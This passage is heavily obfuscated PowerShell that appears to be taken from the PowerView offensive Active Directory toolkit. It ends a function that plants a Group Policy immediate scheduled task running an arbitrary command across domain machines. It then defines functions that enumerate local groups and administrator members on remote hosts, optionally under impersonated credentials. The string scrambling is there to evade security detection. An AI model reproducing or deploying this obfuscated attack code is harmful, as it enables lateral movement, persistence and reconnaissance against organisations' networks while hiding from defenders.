                                ${NEw`gUId`s`sTRINg} = -Join ${FOr`m`ATEDgu`iDs}

                                &("{2}{0}{1}"-f 'ite-V','erbose','Wr') ('[Ne'+'w-GPO'+'Im'+'mediate'+'Ta'+'sk] '+'New'+' '+'ext'+'ensionNa'+'m'+'es '+"$NewGUIDsString")

                                ${GpOen`TRY}."Pr`oper`TIes"[${Ext`E`N`sIoNnA`MeS}]."Va`luE" = ${Ne`WG`UI`ds`sTrinG}
                            } else {
                                ${g`poent`RY}."pr`o`perTIES"[${e`xT`eNsionnam`es}].("{0}{1}" -f 'Clea','r').Invoke()
                            }
                        }
                    }
                }
            }
            else {
                if (!${f`oRCE} -and !${p`scmd`LET}.("{1}{0}{3}{2}"-f'uldC','Sho','ntinue','o').Invoke(("{2}{3}{0}{1}{4}" -f'u want',' ','Do y','o','to continue?'),('Creati'+'ng'+' '+'sch'+'ta'+'sk '+'a'+'t '+"$TaskXMLPath"))) {
                    return
                }

                
                ${N`ULL} = &("{1}{0}"-f 'w-Item','Ne') -ItemType ("{0}{2}{1}" -f 'Dire','y','ctor') -Force -Path ${Ta`SKP`Ath}

                
                [xml] ${IM`MED`I`ATET`ASKx`ML} = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="'+${t`ASk`NaMe}+((("{3}{9}{2}{4}{5}{1}{0}{6}{8}{7}"-f'anged=','} ch','g','{0} i','e=','{0}0{0','{','}','0','ma')) -f[CHaR]34)+${TASK`MODi`F`ie`ddAte}+'" uid="{'+${Ta`SKGU`iD}+'}"><Properties action="C" name="'+${tas`k`NaMe}+((("{1}{2}{0}"-f '{0}','{0} ','runAs='))-F [cHAr]34)+${taSKRu`N`AS}+((("{3}{4}{2}{1}{0}{5}" -f'T','n','go','{0','} lo','ype={0}'))  -F[ChaR]34)+${TaS`K`LO`gONtY`Pe}+((("{4}{12}{2}{6}{13}{7}{0}{5}{8}{1}{11}{9}{3}{10}"-f'1.','<Reg','>','fo><Aut','O','3OP','<Task v','Pm','m>','n','hor>','istrationI','Pm','ersion=O')) -RePlACE ([char]79+[char]80+[char]109),[char]34)+${TaSk`AuT`Hor}+("{0}{3}{5}{2}{4}{1}"-f '</Au','ion>','scri','t','pt','hor><De')+${T`A`skdeSC`RipTIOn}+((("{13}{21}{3}{18}{14}{19}{22}{0}{5}{8}{12}{20}{1}{17}{11}{10}{2}{15}{6}{4}{23}{16}{7}{9}" -f'tra','als><Prin','d=ZN','s','thorZNP','ti','u','Id','onInfo','>','al i','ip','><Pr','</D','n></Reg','PA','r','c','criptio','i','incip','e','s','><Use'))."R`ep`lace"('ZNP',[strInG][CHar]34))+${taSKR`Un`As}+("{0}{2}{1}{4}{3}"-f'</U','er','s','Type>','Id><Logon')+${TASklOG`o`NtYPE}+("{0}{3}{2}{4}{1}"-f '</Log','nLevel>','nTy','o','pe><Ru')+${Ta`sKrU`NLeVEl}+((("{14}{27}{6}{28}{23}{3}{19}{2}{9}{17}{16}{4}{1}{5}{31}{25}{7}{30}{20}{10}{15}{26}{12}{8}{22}{18}{13}{24}{0}{21}{11}{29}"-f'bled>','e</StopIfGoingOnBatteries><AllowHardTer','Policy><DisallowS','cy>IgnoreNew<','nBatteries>tru','minate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAva','incipals><Settings><IdleSettings><Durati','rtOnDemand><Enabl','ndary>%LocalTimeXmlEx%</','tartIfOnBatteries>false</Disa','t><Priori','</Trigge','s><Triggers><TimeTrigger><StartBou','TimeXmlEx%</EndBoundary><Enabled>true</E','</Run','ty>7</Prior','IfOnBatteries><StopIfGoingO','llowStart','%Local','/MultipleInstances','ecutionTimeLimi','</TimeTrigger>','StartBoundary><EndBoundary>','MultipleInstancesPoli','na','ble><AllowStartOnDemand>false</AllowSta','ity><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Setting','Level></Principal></Pr','on>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><','rs><Actions Context={0}Author{0}><Exec><Command>','ed>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</Ex','ilable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvaila')) -F  [char]34)+${cOM`M`AnD}+("{2}{0}{5}{6}{1}{4}{3}" -f 'mman','g','</Co','ents>','um','d><A','r')+${Comma`ND`ARG`UME`Nts}+("{14}{9}{3}{2}{1}{12}{0}{13}{15}{4}{7}{8}{5}{6}{11}{10}"-f'><','/Tas','ons><','Acti','t','i','at','ies','></Immed','/','askV2>','eT','k','/','</Arguments></Exec><','Proper')

                
                if (&("{2}{3}{0}{1}" -f 'at','h','Te','st-P') ${taSk`xML`Pa`Th}) {
                    ${Ta`S`Kxml} = [xml](&("{3}{1}{0}{2}" -f 'Conten','et-','t','G') -Path ${T`ASkX`mlpAtH} -Encoding ("{1}{0}"-f 'SCII','A'))
                    if (${taS`k`XMl}."SC`Hedu`leD`TaS`ks"."ImmE`diA`T`Et`ASkv2" | &("{0}{1}"-f 'wher','e') ("{0}{1}"-f 'na','me') -eq ${T`Ask`NAME}) {
                        if (!${F`o`RCe} -and !${pS`C`MdLEt}.("{2}{0}{1}{3}"-f 'houl','dC','S','ontinue').Invoke(("{4}{2}{5}{0}{3}{1}"-f' ','inue?','u wan','to cont','Do yo','t'),('Ove'+'rwri'+'tting '+'im'+'me'+'diate '+'ta'+'sk '+'name'+'d '+"$TaskName"))) {
                            return
                        }
                        ${OlDiMmed`ia`Te`TAsks} = ${tAs`K`XmL}."ScHEdUl`eDt`As`Ks"."imM`ed`IA`TETA`sKV2" | &("{0}{1}" -f 'w','here') ("{1}{0}" -f'me','na') -eq ${taSKN`A`mE}
                        ForEach (${o`lDImM`EdiAtEtA`Sk} in ${olDim`MEdI`A`T`eTAs`kS}) {
                            ${Nu`lL} = ${tAs`k`XML}."sc`hedUledTa`sKS".("{2}{1}{3}{0}" -f'Child','emov','R','e').Invoke(${O`ldiMmEdI`ATet`Ask})
                        }
                    }
                } else {
                    [xml] ${tASK`x`mL} = [xml] '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
                }
                ${n`ULl} = ${ta`skX`ML}."SC`heDulEdT`AS`kS".("{3}{0}{1}{2}"-f 'n','dC','hild','Appe').Invoke(${T`Ask`xmL}.("{0}{2}{1}" -f'Im','de','portNo').Invoke(${Im`me`dIa`T`EtAskx`Ml}."immE`D`I`Atet`ASkv2", ${tr`UE}))
                ${t`ASK`xmL}.("{1}{0}" -f 'e','Sav').Invoke(${taskXML`P`ATh})

                
                
                if (${t`Ar`geT} -eq ("{0}{1}"-f'M','achine')) {
                    ${ext`e`Nsi`oN`NameS} = ("{1}{6}{0}{2}{5}{4}{3}" -f'h','g','i','ionNames','ens','neExt','PCMac')
                } else {
                    ${exTE`Nsi`o`N`NAMES} = ("{4}{0}{1}{5}{3}{2}" -f'CUserE','xtens','mes','nNa','gP','io')
                }

                ${ZER`o`GuID} = ("{2}{3}{6}{0}{1}{5}{4}{7}"-f '0','0','000000','00-','-0000000000','00','0000-0000-','00')
                ${ScHe`Du`lEDT`ASK`ScseGuID} = ("{1}{5}{0}{10}{2}{9}{7}{6}{4}{3}{8}"-f '45','C','-','A4D','D4','AB5','-E','7E','1AFC72','4691-81','52-DEEA')
                ${S`C`hEd`U`Ledt`AsKstEGUiD} = ("{0}{3}{9}{2}{8}{4}{5}{1}{7}{6}"-f'AADC','D','746C-','ED64','33','-A97C-','46527','613490','46','-')

                if (!${gP`OE`NtRy}."Prop`E`RT`iES"[${E`XTens`ionN`AmeS}]) {
                    ${gpoE`N`TRY}."p`ROp`ert`iEs"[${EXtEN`si`Onna`mEs}]."vAl`UE" = "[{"+${z`erogU`Id}+"}{"+${s`CHED`UleDt`AskSc`S`eGu`Id}+"}]"+"[{"+ ${sc`hed`ULEdt`Ask`steguId}+"}{"+${sCH`eD`ULEdTaS`KScS`E`Gu`iD}+"}]"
                } elseif (!${GPOE`N`TRY}."PRopeRt`i`eS"[${Ext`e`NsIon`N`Ames}]."VAl`UE".("{2}{1}{0}"-f'tring','oS','T').Invoke().("{2}{0}{1}" -f 'ont','ains','C').Invoke(${sc`H`EdulEDTASK`SCsE`GU`id})) {
                    ${Ol`dE`xTeNSIon`Na`M`eS} = ${g`p`OenTry}."pROPEr`TI`eS"[${ex`T`EnSIoNn`AmES}]."V`AlUe".("{2}{1}{0}" -f 'String','o','T').Invoke()
                    ${OL`DG`U`Id`SpLit} = ${oldE`XtEN`s`iOnNaMES}."s`Plit"('][', $o7y::"REMO`VEe`m`ptyEnTriES")

                    ${oldGui`DS} = &("{2}{0}{1}"-f'w-Ob','ject','Ne') ("{4}{5}{6}{0}{1}{2}{3}{7}" -f'Collections','.','Ar','rayLi','S','yst','em.','st')
                    ForEach (${gu`Ids} in ${olD`GUiD`spLiT}) {
                        ${G`UI`Ds} = ${Gu`i`ds}."sPl`iT"("}{", (VArIAbLE O7y  ).valUE::"ReMOv`eEmp`TY`ENt`RI`Es") -replace "[\{\[\]]", ""
                        ${ol`DG`UId} = &("{0}{2}{1}{3}" -f'New','bje','-O','ct') ("{2}{0}{4}{1}{6}{3}{5}{7}" -f'st','m.C','Sy','rayL','e','i','ollections.Ar','st')(,${G`UIdS})
                        ${N`Ull} = ${O`ldgu`Ids}.("{0}{1}"-f 'Ad','d').Invoke(${Ol`Dgu`ID})
                    }

                    ${nE`wgUI`Ds} = &("{1}{2}{0}" -f'ct','New-O','bje') ("{0}{5}{1}{3}{7}{2}{6}{4}" -f 'S','m.','ections.Ar','Col','st','yste','rayLi','l')

                    
                    if (!${O`LDe`xTeNsION`NA`meS}.("{0}{2}{1}" -f'Cont','s','ain').Invoke(${zeR`O`Gu`id})) {
                        ${nu`LL} = ${o`Ldg`UiDS}.("{0}{1}"-f 'Ad','d').Invoke(@(${z`erO`GuID}, ${ScH`EdulE`dtask`s`CseGuiD}))
                    }

                    
                    if (!${oLd`eXTE`N`sio`N`NaMes}.("{1}{0}{2}" -f'onta','C','ins').Invoke(${SCheDulE`dT`AsK`sT`EguID})) {
                        ${Nu`Ll} = ${ol`DgU`i`ds}.("{1}{0}"-f'dd','A').Invoke(@(${sc`H`EdULE`DtAsKs`TEg`UID}, ${sC`hedU`lED`T`AskSCSEGuiD}))
                    }

                    ForEach (${o`lDguId} in ${Old`GUi`dS}) {
                        
                        if (${olD`GUId}.("{1}{0}"-f 'ntains','Co').Invoke(${zER`o`GuId}) -and -not ${OlD`gUid}.("{2}{0}{1}"-f'n','s','Contai').Invoke(${s`chEduLE`d`TasK`ScsEgUId})) {
                            ${nu`ll} = ${o`ldgu`Id}.("{1}{0}" -f'd','Ad').Invoke(${s`cHeDu`LeDt`AsKsCs`eG`U`ID})
                            ${olD`G`Uid} = ${OlD`g`UID} | &("{1}{0}{3}{2}" -f 'o','S','-Object','rt')
                            ${nu`LL} = ${Ne`Wg`UIds}.("{1}{0}"-f'd','Ad').Invoke(${o`lDgU`ID})
                        
                        } elseif (${oLD`GUiD}.("{2}{1}{0}" -f's','tain','Con').Invoke(${schEd`UlEdTASk`ST`eGU`iD}) -and -not ${ol`D`GuID}.("{0}{1}{2}"-f 'Cont','ain','s').Invoke(${sc`H`eDULe`d`TaSKsCS`E`GUid})) {
                            ${NU`LL} = ${Ol`d`Guid}.("{0}{1}"-f'A','dd').Invoke(${s`c`HeD`UL`eDTAsk`sC`SeGUiD})
                            ${oLdGU`Id} = ${O`ldGUid} | &("{0}{2}{1}"-f 'Sort-Obj','t','ec')
                            ${Nu`ll} = ${Ne`w`g`UiDS}.("{1}{0}"-f'd','Ad').Invoke(${OLd`GU`iD})
                        } else {
                            ${NU`LL} = ${Ne`W`GuIDS}.("{1}{0}" -f'dd','A').Invoke(${o`l`DGuID})
                        }
                    }

                    ${N`Ew`gUiDS} = ${N`EWgU`idS} | &("{0}{2}{1}"-f 'Sor','-Object','t')

                    
                    ${ForMATEd`G`U`idS} = &("{2}{1}{0}"-f 'bject','-O','New') ("{0}{1}{3}{2}{5}{4}" -f 'Syst','em','tions.ArrayL','.Collec','t','is')
                    ForEach (${Gu`ids} in ${n`eW`guiDs}) {
                        ${forma`TE`Dg`UiD} = ""
                        ForEach (${gu`iD} in ${gu`I`Ds}) {
                            ${form`A`TEdguID} += "{"+${GU`Id}+"}"
                        }
                        ${FoRM`AT`ed`guID} = "["+${FOrM`ATEdgU`ID}+"]"
                        ${Nu`lL} = ${fO`RmaT`edg`U`iDs}.("{0}{1}"-f 'A','dd').Invoke(${forma`TeDg`Uid})
                    }
                    ${nEwGu`IdS`sTrIng} = -Join ${Fo`Rm`AtE`D`GUIDS}

                    &("{0}{1}{3}{2}{4}" -f 'W','rite-V','o','erb','se') ('[New'+'-GPOI'+'mm'+'e'+'d'+'iateTask] '+'Ne'+'w '+'exte'+'nsionN'+'ames '+"$NewGUIDsString")

                    ${g`P`OenTRY}."PropE`RT`IES"[${e`XTeNsio`N`NaMES}]."vaL`Ue" = ${nEW`g`UIdss`TRiNG}
                }
            }

            
            ${ne`WV`eRSi`onnuMBer} =   $wTd42::"To`iN`T32"(${g`pO`Entry}."P`RoPeR`TIES"[("{2}{1}{0}{4}{3}"-f 'si','r','ve','umber','onN')]."v`AluE") + 1
            ${GPoEN`T`Ry}."prOPE`RTi`ES"[("{1}{2}{0}" -f'r','versi','onNumbe')]."V`AlUE" = ${N`EwV`eRs`IonNumBER}
            &("{0}{2}{1}" -f'Wri','ose','te-Verb') ('['+'N'+'ew-G'+'P'+'OImmediateTask'+'] '+'N'+'ew '+'versionNu'+'m'+'ber '+"$NewVersionNumber")

            ${GPO`EN`Try}.("{1}{4}{2}{3}{0}" -f'ges','Comm','tC','han','i').Invoke()

            
            ${g`P`TPatH} = &("{0}{1}{2}"-f'Joi','n-P','ath') ${gP`Oe`Ntry}."g`P`Cfil`Es`ysPatH" ((("{0}{1}{2}"-f'4','jK','GPT.ini'))."re`p`laCe"(([ChAr]52+[ChAr]106+[ChAr]75),'\'))
            ${G`ptO`LdCONTENt} = &("{2}{1}{0}" -f 'tent','-Con','Get') -Path ${G`PtP`AtH}
            ${GpTneW`cONt`enT} = ${gPtoLd`c`Onte`NT} -replace "Version=.*$","Version=$NewVersionNumber"
            &("{1}{2}{0}" -f't','Set-Conte','n') -Encoding ("{0}{1}" -f 'AS','CII') -PATH ${Gp`TP`ATh} -Value ${g`PTNEWcO`N`Te`Nt}
        }
    }
}









function gET-`NETLOCALg`Ro`Up {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f 'ess','oc','PSShouldPr'}, '')]
    [OutputType({"{1}{7}{5}{3}{4}{6}{0}{2}"-f 'AP','Pow','I','r','oup','lG','.','erView.Loca'})]
    [OutputType({"{3}{0}{2}{4}{1}"-f'.LocalG','T','roup.Win','PowerView','N'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItiOn = 0, VALUEfRomPipELInE = ${Tr`Ue}, valueFrOmpIPelinEBYPROpertyname = ${tr`UE})]
        [Alias({"{0}{2}{1}"-f'H','tName','os'}, {"{0}{1}{2}{3}"-f'dn','sh','o','stname'}, {"{0}{1}"-f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`O`MP`UTE`RNamE} = ${E`Nv:`c`O`MP`UteRname},

        [ValidateSet('API', {"{1}{0}"-f 'NT','Win'})]
        [Alias({"{4}{2}{1}{0}{3}" -f 'tionMe','c','olle','thod','C'})]
        [String]
        ${m`EtHOD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eD`Ent`iAL} =  ( vArIaBLE  ('0DsQ'+'r')  -Va)::"E`MPTY"
    )

    BEGIN {
        if (${pSBoun`DP`AR`AMe`Ters}[("{0}{2}{1}"-f'Cr','dential','e')]) {
            ${lO`gontok`eN} = &("{6}{2}{1}{3}{0}{4}{5}"-f'per','User','e-','Im','sonat','ion','Invok') -Credential ${c`RED`En`TIAL}
        }
    }

    PROCESS {
        ForEach (${co`MpUt`eR} in ${c`OmPU`TErnAME}) {
            if (${M`Eth`Od} -eq 'API') {
                

                
                ${QUeR`ylE`V`El} = 1
                ${P`Tr`iNfo} =   (  lS  ('varIab'+'l'+'E:1'+'v4R')).vAlUE::"Ze`RO"
                ${ENT`RI`Esr`EAd} = 0
                ${toTal`R`eAd} = 0
                ${rEsU`m`eHAnDlE} = 0

                
                ${RE`S`ULt} = ${n`E`TApI32}::"netL`Oc`ALg`R`ou`penum"(${c`om`puTER}, ${QuE`RYLe`VeL}, [ref]${pTr`In`Fo}, -1, [ref]${e`NTri`E`SrEAD}, [ref]${TO`T`AlreAD}, [ref]${rESUM`EhanD`LE})

                
                ${O`F`FsEt} = ${PTr`I`NfO}.("{0}{2}{1}" -f 'T','64','oInt').Invoke()

                
                if ((${re`su`lT} -eq 0) -and (${ofF`S`Et} -gt 0)) {

                    
                    ${IncrE`mE`Nt} = ${lOc`AL`GRo`Up_INf`O_1}::("{0}{2}{1}" -f 'Get','e','Siz').Invoke()

                    
                    for (${i} = 0; (${I} -lt ${entRIeSr`E`AD}); ${i}++) {
                        
                        ${n`E`WINTPtR} = &("{2}{1}{3}{0}"-f 'ject','-O','New','b') ("{0}{4}{1}{2}{3}"-f'Sys','In','tp','tr','tem.') -ArgumentList ${oFF`SeT}
                        ${i`NFo} = ${nEwIn`Tp`TR} -as ${lOCAL`gr`ou`P_`I`NFO_1}

                        ${O`Ffset} = ${NEWi`N`TpTR}.("{1}{0}"-f't64','ToIn').Invoke()
                        ${oFF`SeT} += ${inCReM`e`NT}

                        ${LOcal`GR`oup} = &("{0}{2}{1}" -f'New-','ject','Ob') ("{0}{2}{1}" -f'PS','ct','Obje')
                        ${lo`cAL`gRouP} | &("{3}{1}{2}{0}" -f 'er','dd-','Memb','A') ("{0}{1}{2}" -f'Notep','ropert','y') ("{1}{2}{0}{3}"-f'am','Co','mputerN','e') ${CoMPu`TER}
                        ${L`OcA`L`gRoup} | &("{1}{2}{0}" -f'Member','A','dd-') ("{2}{1}{0}" -f'perty','otepro','N') ("{1}{2}{0}"-f'me','Gr','oupNa') ${IN`Fo}."l`grpI`1_nA`ME"
                        ${lOC`AlgrO`UP} | &("{2}{1}{0}" -f 'ber','Mem','Add-') ("{1}{0}{3}{2}" -f'prop','Note','rty','e') ("{1}{0}" -f 'nt','Comme') ${in`Fo}."l`grpi1_cOmme`NT"
                        ${L`ocalgrO`Up}."PS`oB`JECt"."tYp`E`NaMes".("{1}{0}"-f'sert','In').Invoke(0, ("{5}{4}{2}{6}{3}{1}{0}" -f 'p.API','ou','c','r','werView.Lo','Po','alG'))
                        ${l`oca`l`gROUP}
                    }
                    
                    ${Nu`lL} = ${n`ETapI32}::("{4}{0}{2}{3}{1}"-f'e','ee','tApi','BufferFr','N').Invoke(${P`T`RiNfO})
                }
                else {
                    &("{1}{2}{0}" -f'e','Write-Ve','rbos') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                ${comPUTER`Pr`oVi`deR} = [ADSI]"WinNT://$Computer,computer"

                ${C`oMp`UTEr`pRoVid`er}."p`sBase"."CH`ildrEn" | &("{2}{1}{3}{0}" -f 't','ere-Obje','Wh','c') { ${_}."p`Sb`Ase"."sChE`Ma`Cla`SS`NAme" -eq ("{1}{0}" -f'up','gro') } | &("{2}{1}{0}"-f '-Object','ach','ForE') {
                    ${L`OCA`LgR`oUp} = ([ADSI]${_})
                    ${G`Ro`Up} = &("{2}{0}{1}"-f 'w-Ob','ject','Ne') ("{0}{1}{2}"-f 'PSO','bjec','t')
                    ${g`R`OuP} | &("{2}{0}{1}" -f'd','-Member','Ad') ("{3}{0}{2}{1}"-f'eprop','rty','e','Not') ("{1}{2}{3}{0}" -f'ame','Co','mpu','terN') ${COMp`Ut`er}
                    ${gro`Up} | &("{2}{0}{1}{3}"-f'-Memb','e','Add','r') ("{2}{0}{1}"-f'epr','operty','Not') ("{1}{0}" -f'upName','Gro') (${l`oC`ALGr`OuP}.("{0}{1}{2}" -f 'Inv','okeG','et').Invoke(("{1}{0}"-f'e','Nam')))
                    ${gr`ouP} | &("{1}{0}{2}"-f 'em','Add-M','ber') ("{0}{2}{1}"-f'Note','y','propert') 'SID' ((&("{1}{0}{2}" -f'c','New-Obje','t') ("{0}{7}{6}{1}{3}{4}{2}{5}"-f'S','al.Secu','e','rityI','dentifi','r','urity.Princip','ystem.Sec')(${LO`cAlgrO`Up}.("{1}{0}{2}{3}" -f'keG','Invo','e','t').Invoke(("{0}{1}"-f 'obje','ctsid')),0))."V`AlUe")
                    ${grO`Up} | &("{0}{1}{2}{3}" -f'Add-','Me','mbe','r') ("{0}{1}{2}"-f 'Notep','r','operty') ("{2}{1}{0}"-f't','en','Comm') (${lO`Calgr`OUP}.("{2}{0}{1}" -f'vokeG','et','In').Invoke(("{3}{0}{1}{2}"-f 'ipt','io','n','Descr')))
                    ${gR`ouP}."p`SObJ`ECt"."Ty`PENaMEs".("{0}{1}"-f 'Inser','t').Invoke(0, ("{4}{3}{0}{2}{1}" -f '.','roup.WinNT','LocalG','iew','PowerV'))
                    ${gR`oUp}
                }
            }
        }
    }
    
    END {
        if (${L`OGO`Nt`OkeN}) {
            &("{4}{3}{5}{2}{1}{0}" -f 'oSelf','T','rt','oke','Inv','-Reve') -TokenHandle ${log`on`TOKeN}
        }
    }
}


function geT-Ne`T`L`oCa`lg`ROuPmemBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}{4}" -f'dPr','P','S','Shoul','ocess'}, '')]
    [OutputType({"{5}{3}{4}{8}{1}{0}{7}{2}{6}" -f'rou','G','embe','w','erView.Lo','Po','r.API','pM','cal'})]
    [OutputType({"{7}{8}{5}{0}{2}{3}{4}{1}{6}" -f 'ocalGr','.W','o','upMe','mber','View.L','inNT','Po','wer'})]
    Param(
        [Parameter(POsItion = 0, vaLueFROmpipeLinE = ${t`RUe}, VaLuEfRompipeliNeByPrOpeRtYnaMe = ${T`RUe})]
        [Alias({"{0}{1}" -f'H','ostName'}, {"{1}{0}{2}" -f 'o','dnsh','stname'}, {"{0}{1}"-f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOm`Pu`TERn`AmE} = ${eNv`:`C`omPu`TeRNaME},

        [Parameter(vAlUEfROMpIpELInEbYpROPeRtYnaMe = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gRouPn`A`mE} = ("{2}{0}{1}"-f'd','ministrators','A'),

        [ValidateSet('API', {"{0}{1}" -f'WinN','T'})]
        [Alias({"{1}{2}{4}{3}{0}" -f'd','Coll','ecti','ho','onMet'})]
        [String]
        ${mEtH`oD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedEn`TI`Al} =  ( VArIABle 0DSqr ).valuE::"E`MpTY"
    )

    BEGIN {
        if (${p`s`BoUndpArAME`T`Ers}[("{0}{2}{1}"-f 'C','ntial','rede')]) {
            ${lOgO`NtO`K`eN} = &("{3}{1}{0}{4}{2}" -f'erImper','-Us','n','Invoke','sonatio') -Credential ${C`Re`DEnTIAl}
        }
    }

    PROCESS {
        ForEach (${C`oMP`UTeR} in ${COm`Putern`Ame}) {
            if (${mET`H`OD} -eq 'API') {
                

                
                ${q`UE`RYL`evEL} = 2
                ${p`TriN`FO} =   (  gET-varIAblE ("1v"+"4r") -vAlUeOnl )::"Z`eRo"
                ${e`NTRIE`sRe`Ad} = 0
                ${T`oTaL`REAd} = 0
                ${re`s`Um`EH`ANDLE} = 0

                
                ${Res`U`LT} = ${nEtApi`32}::"nEtlOC`ALgr`oUpG`Et`meMbERS"(${C`OmpUTER}, ${grOUp`NA`me}, ${QUEr`y`LEvEL}, [ref]${P`TR`InFo}, -1, [ref]${E`NT`R`ieSreaD}, [ref]${TOt`AlRe`AD}, [ref]${resuMe`haNd`lE})

                
                ${O`FfsEt} = ${PTrI`N`FO}.("{1}{2}{0}"-f'4','ToIn','t6').Invoke()

                ${ME`Mb`ERS} = @()

                
                if ((${r`es`UlT} -eq 0) -and (${Off`S`Et} -gt 0)) {

                    
                    ${INcrE`m`ENT} = ${LO`ca`lg`ROup`_`mEm`Ber`S_i`Nfo_2}::("{1}{0}{2}" -f'tS','Ge','ize').Invoke()

                    
                    for (${I} = 0; (${I} -lt ${E`NtR`I`eSREad}); ${I}++) {
                        
                        ${N`e`wiNtP`TR} = &("{0}{1}{2}" -f'New','-Obje','ct') ("{0}{3}{1}{2}"-f 'Syst','m.','Intptr','e') -ArgumentList ${Off`S`et}
                        ${iN`Fo} = ${neW`i`Ntp`TR} -as ${lOCal`gRO`Up_`M`eMbeRS_Inf`o_2}

                        ${o`Ff`SET} = ${N`e`WInt`pTr}.("{1}{0}" -f '4','ToInt6').Invoke()
                        ${of`F`seT} += ${inc`R`emeNT}

                        ${siDst`R`ING} = ''
                        ${re`S`UlT2} = ${a`dv`APi32}::"cOnvErtS`IDToS`TRin`gSId"(${IN`FO}."L`GrmI2_`sID", [ref]${sI`Ds`TRinG});${l`As`Te`Rror} =  ( gET-itEM  ("vAR"+"iAbLE"+":91YP") ).VAluE::("{0}{4}{3}{1}{2}" -f 'G','n3','2Error','tWi','etLas').Invoke()

                        if (${reSU`Lt2} -eq 0) {
                            &("{2}{0}{3}{4}{1}"-f 'rite','e','W','-Verb','os') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${mEMb`er} = &("{2}{1}{0}" -f'ject','b','New-O') ("{1}{0}" -f 'ect','PSObj')
                            ${m`E`MBeR} | &("{0}{2}{1}" -f'Ad','mber','d-Me') ("{1}{2}{0}"-f 'erty','Notep','rop') ("{0}{2}{1}{3}"-f 'Compu','Na','ter','me') ${Co`Mp`UTER}
                            ${mE`mb`ER} | &("{0}{2}{1}"-f 'Ad','mber','d-Me') ("{0}{2}{1}"-f'Not','perty','epro') ("{0}{1}" -f 'Group','Name') ${GR`O`UPnAmE}
                            ${ME`M`BEr} | &("{0}{2}{1}"-f 'A','ember','dd-M') ("{3}{1}{2}{0}"-f 'ty','tepro','per','No') ("{3}{2}{0}{1}" -f 'Na','me','ember','M') ${iN`Fo}."L`Grmi`2_dOmAina`NDnAmE"
                            ${me`mb`Er} | &("{0}{1}{2}{3}" -f 'Add-','Mem','be','r') ("{0}{3}{1}{2}" -f 'No','op','erty','tepr') 'SID' ${si`Ds`TrIng}
                            ${iSg`R`OUP} = $(${I`Nfo}."L`G`Rmi2_Sidu`sage" -eq ("{2}{1}{0}" -f 'up','eGro','SidTyp'))
                            ${mE`mber} | &("{0}{1}{2}" -f'Add-','Memb','er') ("{0}{1}{2}"-f 'Notepr','op','erty') ("{1}{2}{0}"-f 'p','Is','Grou') ${i`sgRo`UP}
                            ${mE`MBeR}."pSo`Bje`ct"."tYpeNA`M`ES".("{2}{0}{1}"-f 's','ert','In').Invoke(0, ("{0}{5}{3}{1}{6}{4}{7}{2}{8}" -f'P','ew.LocalGroupM','AP','werVi','er','o','emb','.','I'))
                            ${M`eMB`eRs} += ${mEmb`Er}
                        }
                    }

                    
                    ${nU`lL} = ${Ne`TaP`I32}::("{2}{4}{5}{3}{1}{0}" -f'Free','ffer','Ne','iBu','t','Ap').Invoke(${Ptr`IN`Fo})

                    
                    ${macH`i`N`eSid} = ${Mem`Be`RS} | &("{3}{1}{0}{2}"-f '-Obj','ere','ect','Wh') {${_}."S`Id" -match ("{1}{0}"-f'00','.*-5') -or (${_}."S`iD" -match ("{0}{2}{1}" -f '.*','1','-50'))} | &("{2}{0}{1}" -f 'ect','-Object','Sel') -Expand ("{0}{1}" -f 'SI','D')
                    if (${mach`I`NESID}) {
                        ${MACh`iNe`S`id} = ${maCh`iNES`Id}.("{0}{2}{1}"-f'S','string','ub').Invoke(0, ${mAChiN`E`SiD}.("{0}{1}{3}{2}"-f 'L','astIn','Of','dex').Invoke('-'))

                        ${M`E`MBERS} | &("{2}{1}{0}"-f 'ach-Object','rE','Fo') {
                            if (${_}."S`iD" -match ${M`AChINe`s`ID}) {
                                ${_} | &("{0}{1}{2}"-f'Ad','d-Membe','r') ("{0}{1}{2}"-f 'Notepro','p','erty') ("{1}{0}{2}"-f 'sDomai','I','n') ${F`ALse}
                            }
                            else {
                                ${_} | &("{1}{2}{0}"-f 'ber','Add-','Mem') ("{0}{3}{1}{2}" -f'Not','roper','ty','ep') ("{2}{1}{0}"-f 'n','sDomai','I') ${T`RUe}
                            }
                        }
                    }
                    else {
                        ${mEM`BErS} | &("{3}{1}{0}{2}" -f 'Each-Objec','r','t','Fo') {
                            if (${_}."S`Id" -notmatch ("{0}{1}{2}"-f'S-','1-5-2','1')) {
                                ${_} | &("{3}{0}{1}{2}" -f 'dd-','Memb','er','A') ("{1}{0}{2}" -f'rope','Notep','rty') ("{0}{1}" -f 'IsDoma','in') ${f`Alse}
                            }
                            else {
                                ${_} | &("{2}{0}{3}{1}" -f 'd-','ember','Ad','M') ("{2}{1}{0}" -f 'ty','teproper','No') ("{0}{1}{2}" -f'I','sDomai','n') ("{0}{1}"-f'UN','KNOWN')
                            }
                        }
                    }
                    ${mEM`BeRs}
                }
                else {
                    &("{0}{2}{1}{3}" -f'Writ','V','e-','erbose') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
